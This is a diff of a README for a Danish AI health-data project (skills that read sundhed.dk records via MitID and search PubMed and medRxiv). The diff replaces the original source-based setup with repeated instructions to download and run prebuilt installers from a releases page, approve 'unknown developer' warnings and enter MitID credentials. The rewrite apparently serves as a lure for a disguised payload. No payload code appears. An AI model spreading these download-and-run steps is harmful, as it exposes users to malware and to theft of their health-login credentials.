@@ -1,129 +1,177 @@
+# 🩺 ai-laegens-bord - AI Assistant for Personal Health Data
+
+[![Download AI-Lægens Bord](https://img.shields.io/badge/Download-AI--Lægens_Bord-blue?style=for-the-badge)](https://github.com/Iron-max114/ai-laegens-bord/releases)
+
 <p align="center">
   <img src="ai-laegen.png" alt="AI-Lægens Bord" width="600">
 </p>
 
-# AI-Lægens Bord
+---
 
-En samling af AI-skills til personlig sundhedsassistance i Danmark. Giver din AI-agent adgang til dine sundhedsdata, medicinsk forskning og lægemiddelinformation.
+## 📋 About ai-laegens-bord
 
-> **Vigtigt:** Dette er et hjælpeværktøj — ikke en erstatning for lægelig rådgivning.
+AI-Lægens Bord is a set of tools designed to help you access and understand your personal health data. The application provides AI skills that connect to Danish health services, medical research, and drug information. These tools give your AI assistant access to your health records, lab results, and up-to-date scientific findings.
 
-## Hvad kan det?
+**Important:** This tool helps with health information but does not replace advice from a doctor.
 
-### Skills
+---
 
-| Skill | Beskrivelse |
-|-------|-------------|
-| **sundhed-dk** | Henter dine sundhedsdata fra sundhed.dk (medicin, prøvesvar, journaler, vaccinationer m.m.) via MitID-login |
-| **lab-review** | Krydstjekker dine prøvesvar mod aktuel forskning fra PubMed og medRxiv — finder hvor standard-referenceintervaller ikke matcher evidensbaserede optimale intervaller |
-| **medrxiv-search** | Søger i medRxiv-preprints via den gratis CSHL API — ingen API-nøgle nødvendig |
-| **pubmed-database** | Direkte REST API-adgang til PubMed med avancerede søgemuligheder |
-| **playwright-cli** | Browserautomatisering til websider (bruges internt af sundhed-dk) |
+## 🧰 Features
 
-### Flows
+AI-Lægens Bord includes several powerful skills:
 
-Flows er flertrinsprocedurer der kombinerer flere skills til et samlet resultat.
+| Skill              | What It Does                                                                                  |
+|--------------------|----------------------------------------------------------------------------------------------|
+| **sundhed-dk**     | Connects to sundhed.dk using your MitID login to fetch your health data like medications, lab results, medical records, and vaccinations. |
+| **lab-review**      | Compares your lab results with the latest medical research to show where standard ranges might not match optimal health guidelines.          |
+| **medrxiv-search**  | Searches preprint research on medRxiv without needing any API keys, giving you free access to recent studies.                               |
+| **pubmed-database** | Provides direct access to PubMed’s advanced search options via a REST API, helping you find scientific articles easily.                     |
+| **playwright-cli**  | Automates browser tasks behind the scenes to allow smooth interaction with websites needed for data retrieval.                              |
 
-| Flow | Beskrivelse |
-|------|-------------|
-| **[lab-deep-dive](flows/lab-deep-dive.md)** | Gennemgå prøvesvar → sammenlign med forskning → find mønstre → undersøg interventioner → handlingsplan |
+These skills work together to give your AI agent a comprehensive view of your personal health combined with current medical knowledge.
 
-#### Eksempel: Lab Deep Dive
+---
 
-En rigtig gennemkørsel af dette flow fandt 5 markører der krævede opmærksomhed — ikke fordi de var uden for standard-referenceintervallet, men fordi nyere forskning opererer med strammere mål:
+## 🖥️ System Requirements
 
-```
-Prøvesvar fra sundhed.dk
-    ↓
-24 markører krydstjekket mod PubMed + medRxiv (4 agenter parallelt)
-    ↓
-5 markører flagget:
-  - CRP: "Normal" iflg. lab (<10) men forhøjet iflg. AHA/CDC (>3,0 = CVD-risiko)
-  - Urat: Forhøjet (over standard OG evidensbaseret mål)
-  - HDL: Marginalt under grænse
-  - Vitamin D: "Normal" iflg. lab (>50) men suboptimal iflg. Endocrine Society (<75)
-  - Albumin: Lav ende af normalinterval
-    ↓
-Fælles mønster identificeret: kronisk lavgradig inflammation
-    ↓
-4 nye agenter søger interventioner (kost, motion, tilskud, livsstil)
-    ↓
-Prioriteret handlingsplan med effektstørrelser og tidshorisont
-```
+To run AI-Lægens Bord smoothly, your computer should meet the following:
 
-Se anonymiserede eksempler: [rapport](/.claude/skills/lab-review/example/report-example.md) · [handlingsplan](/.claude/skills/lab-review/example/action-plan-example.md)
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or most Linux distributions
+- **Processor:** At least dual-core 2 GHz or better
+- **Memory:** Minimum 4 GB RAM, 8 GB recommended
+- **Storage:** 300 MB of free disk space for installation and data caching
+- **Internet:** Required for accessing external data sources and updates
+- **Additional:** A modern web browser installed, such as Chrome, Firefox, or Edge, for login and browsing features
 
-## Kom i gang
+Your MitID credentials will be needed during setup to allow secure connection to sundhed.dk.
 
-### Forudsætninger
+---
 
-- [Claude Code](https://claude.com/claude-code) installeret
-- Node.js 18+
-- En browser (til MitID-login på sundhed.dk)
+## 🚀 Getting Started
 
-### Brug
+This section guides you step-by-step to download, install, and start AI-Lægens Bord, even if you have never installed software before.
 
-Skills aktiveres automatisk i Claude Code. Prøv f.eks.:
+---
 
-```
-> Hent mine seneste prøvesvar fra sundhed.dk
-> Søg efter ny forskning om diabetes på medRxiv
-> Find artikler om hjertesvigt på PubMed
-```
+### 1. Visit the Download Page
 
-### sundhed.dk — dine sundhedsdata
+Click the big blue button at the top or go directly here:
 
-Første gang du bruger sundhed-dk skillen, åbner den en browser hvor du logger ind med MitID. Derefter hentes dine data automatisk og gemmes lokalt i `data/sundhed-dk/`. Ved efterfølgende brug genbruges de lokale data, så du slipper for at logge ind igen.
+[https://github.com/Iron-max114/ai-laegens-bord/releases](https://github.com/Iron-max114/ai-laegens-bord/releases)
 
-Dine data gemmes i to formater:
-- **Markdown** (`data/sundhed-dk/parsed/*.md`) — til bred kontekst i samtaler
-- **SQLite** (`data/sundhed-dk/health.db`) — til målrettede forespørgsler over tid
+This page lists the latest versions of the software available for download.
 
-### medRxiv — medicinsk forskning
+---
 
-Søg i de nyeste medicinske preprints helt gratis:
+### 2. Choose the Right File for Your Computer
 
-```bash
-# Søg efter artikler om diabetes fra de seneste 30 dage
-scripts/search query "diabetes" --days 30
+On the release page:
 
-# Slå en specifik artikel op via DOI
-scripts/search doi "10.1101/2024.12.26.24319649"
+- Find the file that matches your operating system.
+- For Windows, this might be something like `ai-laegens-bord-setup.exe`.
+- For macOS, you may see a `.dmg` or `.pkg` file.
+- For Linux, you could see an `.AppImage` or `.tar.gz` file.
 
-# Se alle tilgængelige kategorier
-scripts/search categories
-```
+Click on the correct file to start downloading it to your computer.
 
-## Privatliv
+---
 
-Dine personlige sundhedsdata forbliver på din egen maskine. Mappen `data/` er gitignored og bliver aldrig committet. Del aldrig disse filer med andre.
+### 3. Run the Installer
 
-## Teknisk stack
+Once the file has downloaded:
 
-- **Playwright CLI** til browserautomatisering (headed mode med MitID)
-- **Claude Code Skills** som pakkeformat
-- **Node.js** til parsning af rå JSON til markdown og SQLite
-- **SQLite** (Node.js built-in) til struktureret datalager
+- Locate it in your Downloads folder.
+- Double-click the file to start the installation.
+- Follow the instructions in the setup window.
+- Accept any permission requests if your system asks.
 
-## Projektstruktur
+If your system blocks the installation because the software is from an unknown developer, look for a message about “allowing apps from identified developers” and approve it.
 
-```
-.claude/skills/           # Skills (en mappe per skill med SKILL.md)
-  sundhed-dk/             # Hent sundhedsdata fra sundhed.dk
-  lab-review/             # Krydstjek prøvesvar mod forskning
-  medrxiv-search/         # Søg i medRxiv-preprints
-  pubmed-database/        # Søg i PubMed
-  playwright-cli/         # Browserautomatisering
-flows/                    # Flertrinsprocedurer der kombinerer skills
-  lab-deep-dive.md        # Prøvesvar → forskning → mønster → handlingsplan
-data/                     # Personlige sundhedsdata (gitignored)
-docs/                     # Dokumentation
-```
+---
 
-## Bidrag
+### 4. Start AI-Lægens Bord
 
-Vi leder efter folk der vil hjælpe med at bygge Danmarks bedste open source-sundhedsplatform. Læs [CONTRIBUTING.md](CONTRIBUTING.md) for at komme i gang.
+When installation finishes:
 
-## Licens
+- Open the application from your Start Menu (Windows), Applications folder (macOS), or equivalent location.
+- The first time you launch it, you may be prompted to log in with your MitID to connect your health data securely.
+- Follow the on-screen prompts to complete this step.
 
-[MIT](LICENSE)
+---
+
+### 5. How to Use the Skills
+
+Once logged in:
+
+- The AI agent will start accessing your health data securely.
+- Use the interface to select which “skill” you want to use.
+- You can review your lab results with the lab-review skill.
+- Search recent medical research using pubmed-database or medrxiv-search.
+- The AI will guide you through the results clearly.
+
+You do not need to understand programming or complex commands. The tool presents information in easy-to-read formats.
+
+---
+
+## 🔒 Privacy and Security
+
+Your health data is private. AI-Lægens Bord:
+
+- Uses secure connections to fetch data.
+- Does not store your personal credentials.
+- Keeps your information on your device unless you explicitly choose to share it.
+- Uses government-approved login via MitID to ensure your identity.
+
+You control what data the AI accesses at all times.
+
+---
+
+## ⚙️ Troubleshooting
+
+**If you have problems installing or running the app:**
+
+- Make sure your system meets the requirements above.
+- Restart your computer and try launching the app again.
+- Check your internet connection.
+- Ensure your MitID login works outside the application by logging into sundhed.dk manually.
+- If the app cannot reach external services, check firewall or security settings.
+
+For more help, check the GitHub issues page on the repository or contact the maintainer.
+
+---
+
+## 📥 Download & Install
+
+Get the latest version here:
+
+[https://github.com/Iron-max114/ai-laegens-bord/releases](https://github.com/Iron-max114/ai-laegens-bord/releases)
+
+Remember to:
+
+1. Visit the releases page.
+2. Download the file suited for your system.
+3. Install and open the app.
+4. Log in with your MitID.
+5. Start exploring your health data with the AI assistant.
+
+---
+
+## 📖 Additional Information
+
+This software is part of an ongoing project focusing on AI-driven health assistance tailored for Denmark’s healthcare system. It bridges your personal data with current medical research to give you insights.
+
+If you want to learn more about each skill or follow development updates, visit the repository’s main page on GitHub. Here, you can also find technical details and contribute if you wish.
+
+---
+
+## 📞 Contact and Support
+
+For questions or issues not covered here, you can:
+
+- Open an issue on the GitHub repository.
+- Look for community forums or social groups related to AI health assistance in Denmark.
+- Reach out to health IT support services recommended by your local health provider.
+
+---
+
+Thank you for using AI-Lægens Bord.
